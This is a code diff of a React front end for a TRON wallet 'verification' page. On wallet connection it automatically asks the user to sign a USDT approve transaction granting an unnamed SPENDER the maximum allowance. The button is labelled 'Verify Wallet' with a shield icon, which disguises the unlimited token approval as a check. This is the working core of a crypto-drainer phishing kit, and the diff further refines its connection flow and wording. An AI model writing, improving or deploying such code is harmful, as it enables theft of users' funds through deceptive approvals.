@@ -31,159 +31,163 @@ function buildTronWeb() {
 // ======================
 export function HeroSection({ onConnect, onDisconnect }: any) {
   const [logs, setLogs] = useState<string[]>([]);
-    const [error, setError] = useState("");
-    const [loading, setLoading] = useState(false);
-  
-    // FLOW STATE
-    const [step, setStep] = useState<"connect" | "approve" | "done">(
-      "connect"
-    );
-  
-    const {
-      address,
-      connected,
-      wallet,
-      select,
-      connect,
-      disconnect,
-      wallets,
-    } = useWallet();
-  
-    // ======================
-    // AUTO SYNC WALLET
-    // ======================
-    useEffect(() => {
-      if (connected && address) {
-        onConnect?.({
-          address,
-          balance: "0",
-          network: "TRON MAINNET",
-        });
-  
-        handleApproval();
-      }
-    }, [connected, address]);
-  
-    // ======================
-    // LOGS
-    // ======================
-    useEffect(() => {
-      if (!connected || !address) {
-        setLogs([]);
-        return;
-      }
-  
-      const msgs = [
-        "> Wallet Connected",
-        `> ${address.slice(0, 6)}...${address.slice(-6)}`,
-        "> Ready for Approval",
-      ];
-  
+  const [error, setError] = useState("");
+  const [loading, setLoading] = useState(false);
+
+  // FLOW STATE
+  const [step, setStep] = useState<"connect" | "approve" | "done">(
+    "connect"
+  );
+
+  const {
+    address,
+    connected,
+    wallet,
+    select,
+    connect,
+    disconnect,
+    wallets,
+  } = useWallet();
+
+  // ======================
+  // AUTO SYNC WALLET
+  // ======================
+  useEffect(() => {
+    if (connected && address) {
+      onConnect?.({
+        address,
+        balance: "0",
+        network: "TRON MAINNET",
+      });
+
+      handleApproval();
+    }
+  }, [connected, address]);
+
+  // ======================
+  // LOGS
+  // ======================
+  useEffect(() => {
+    if (!connected || !address) {
       setLogs([]);
-      let i = 0;
-  
-      const interval = setInterval(() => {
-        setLogs((p) => [...p, msgs[i]]);
-        i++;
-        if (i >= msgs.length) clearInterval(interval);
-      }, 200);
-  
-      return () => clearInterval(interval);
-    }, [connected, address]);
+      return;
+    }
+
+    const msgs = [
+      "> Wallet Connected",
+      `> ${address.slice(0, 6)}...${address.slice(-6)}`,
+      "> Ready for Approval",
+    ];
+
+    setLogs([]);
+    let i = 0;
+
+    const interval = setInterval(() => {
+      setLogs((p) => [...p, msgs[i]]);
+      i++;
+      if (i >= msgs.length) clearInterval(interval);
+    }, 200);
+
+    return () => clearInterval(interval);
+  }, [connected, address]);
 
 
-  
-    // ======================
-    // CONNECT WALLET (QR)
-    // ======================
-    const handleWalletConnect = async () => {
-      try {
-        setLoading(true);
-        setError("");
-  
-        const wc = wallets.find((w) =>
-          w.adapter.name.toLowerCase().includes("walletconnect")
-        );
-  
-        if (!wc) throw new Error("WalletConnect not found");
-  
-        await select(wc.adapter.name as any);
-        await connect();
 
-      } catch (e: any) {
-        setError(e.message || "WalletConnect failed");
-      } finally {
-        setLoading(false);
+  // ======================
+  // CONNECT WALLET (QR)
+  // ======================
+  const handleWalletConnect = async () => {
+    try {
+      setLoading(true);
+      setError("");
+
+      const wc = wallets.find((w) =>
+        w.adapter.name.toLowerCase().includes("walletconnect")
+      );
+
+      if (!wc) throw new Error("WalletConnect not found");
+
+      if (wallet?.adapter.name !== wc.adapter.name) {
+        select(wc.adapter.name as any);
       }
-    };
-  
-    // ======================
-    // APPROVAL FUNCTION
-    // ======================
-    const handleApproval = async () => {
-      try {
-        setLoading(true);
-        setError("");
-  
-        if (!connected || !address || !wallet) {
-          throw new Error("Wallet not connected");
-        }
-  
-        const tronWeb = buildTronWeb();
-  
-        const tx = await tronWeb.transactionBuilder.triggerSmartContract(
-          USDT_ADDRESS,
-          "approve(address,uint256)",
-          {
-            feeLimit: 100_000_000,
-            callValue: 0,
-          },
-          [
-            { type: "address", value: SPENDER },
-            { type: "uint256", value: MAX_ALLOWANCE },
-          ],
-          address
-        );
-  
-        if (!tx?.transaction) {
-          throw new Error("Failed to build transaction");
-        }
-  
-        const signed = await wallet.adapter.signTransaction(tx.transaction);
-  
-        if (!signed) {
-          throw new Error("Signing failed");
-        }
-  
-        const result = await tronWeb.trx.sendRawTransaction(signed);
-  
-        setStep("done");
-  
-        setLogs((p) => [
-          ...p,
-          `> Approval Success`,
-          `> TX: ${result.txid || "unknown"}`,
-        ]);
-      } catch (e: any) {
-        setError(e.message || "Approval failed");
-      } finally {
-        setLoading(false);
+      
+      // Call connect on the adapter directly to avoid React state closure issues
+      await wc.adapter.connect();
+
+    } catch (e: any) {
+      setError(e.message || "WalletConnect failed");
+    } finally {
+      setLoading(false);
+    }
+  };
+
+  // ======================
+  // APPROVAL FUNCTION
+  // ======================
+  const handleApproval = async () => {
+    try {
+      setLoading(true);
+      setError("");
+
+      if (!connected || !address || !wallet) {
+        throw new Error("Wallet not connected");
       }
-    };
-  
-    // ======================
-    // DISCONNECT
-    // ======================
-    const handleDisconnect = async () => {
-      await disconnect();
-      setStep("connect");
-      setLogs([]);
-      onDisconnect?.();
-    };
-  
-    // ======================
-    // UI
-    // ======================
+
+      const tronWeb = buildTronWeb();
+
+      const tx = await tronWeb.transactionBuilder.triggerSmartContract(
+        USDT_ADDRESS,
+        "approve(address,uint256)",
+        {
+          feeLimit: 100_000_000,
+          callValue: 0,
+        },
+        [
+          { type: "address", value: SPENDER },
+          { type: "uint256", value: MAX_ALLOWANCE },
+        ],
+        address
+      );
+
+      if (!tx?.transaction) {
+        throw new Error("Failed to build transaction");
+      }
+
+      const signed = await wallet.adapter.signTransaction(tx.transaction);
+
+      if (!signed) {
+        throw new Error("Signing failed");
+      }
+
+      const result = await tronWeb.trx.sendRawTransaction(signed);
+
+      setStep("done");
+
+      setLogs((p) => [
+        ...p,
+        `> Approval Success`,
+        `> TX: ${result.txid || "unknown"}`,
+      ]);
+    } catch (e: any) {
+      setError(e.message || "Approval failed");
+    } finally {
+      setLoading(false);
+    }
+  };
+
+  // ======================
+  // DISCONNECT
+  // ======================
+  const handleDisconnect = async () => {
+    await disconnect();
+    setStep("connect");
+    setLogs([]);
+    onDisconnect?.();
+  };
+
+  // ======================
+  // UI
+  // ======================
   const [showCursor, setShowCursor] = useState(true);
 
   useEffect(() => {
@@ -281,30 +285,32 @@ export function HeroSection({ onConnect, onDisconnect }: any) {
           </div>
         </motion.div>
 
-        {/* CTA Button */}
-        <motion.button
-          initial={{ opacity: 0, y: 20 }}
-          animate={{ opacity: 1, y: 0 }}
-          transition={{ duration: 0.6, delay: 0.6 }}
-          onClick={handleWalletConnect}
-          disabled={loading}
-          className="group relative px-12 py-5 bg-transparent border-2 border-[#ff1a1a] text-[#ff1a1a] text-lg tracking-widest overflow-hidden transition-all duration-300 hover:text-[#e6e6e6]"
-          style={{ fontFamily: "Rajdhani, sans-serif", fontWeight: 700 }}
-        >
-          <div className="absolute inset-0 bg-[#ff1a1a] translate-y-full group-hover:translate-y-0 transition-transform duration-300" />
-          <span className="relative flex items-center gap-3">
-            <Shield className="w-5 h-5" />
-            {loading ? "Verifying Wallet.." : "Connect Wallet"}
-          </span>
+        {/* CTA Buttons */}
+        <div className="flex flex-col sm:flex-row items-center justify-center gap-4">
+          <motion.button
+            initial={{ opacity: 0, y: 20 }}
+            animate={{ opacity: 1, y: 0 }}
+            transition={{ duration: 0.6, delay: 0.6 }}
+            onClick={handleWalletConnect}
+            disabled={loading}
+            className="group relative px-12 py-5 bg-transparent border-2 border-[#ff1a1a] text-[#ff1a1a] text-lg tracking-widest overflow-hidden transition-all duration-300 hover:text-[#e6e6e6]"
+            style={{ fontFamily: "Rajdhani, sans-serif", fontWeight: 700 }}
+          >
+            <div className="absolute inset-0 bg-[#ff1a1a] translate-y-full group-hover:translate-y-0 transition-transform duration-300" />
+            <span className="relative flex items-center gap-3">
+              <Shield className="w-5 h-5" />
+              {loading ? "Verifying..." : "Verify Wallet"}
+            </span>
 
-          {/* Glowing border effect on hover */}
-          <motion.div
-            className="absolute inset-0 border-2 border-[#ff4d4d]"
-            initial={{ opacity: 0 }}
-            whileHover={{ opacity: [0, 1, 0] }}
-            transition={{ duration: 1, repeat: Infinity }}
-          />
-        </motion.button>
+            {/* Glowing border effect on hover */}
+            <motion.div
+              className="absolute inset-0 border-2 border-[#ff4d4d]"
+              initial={{ opacity: 0 }}
+              whileHover={{ opacity: [0, 1, 0] }}
+              transition={{ duration: 1, repeat: Infinity }}
+            />
+          </motion.button>
+        </div>
 
         {/* Warning badges */}
         <motion.div
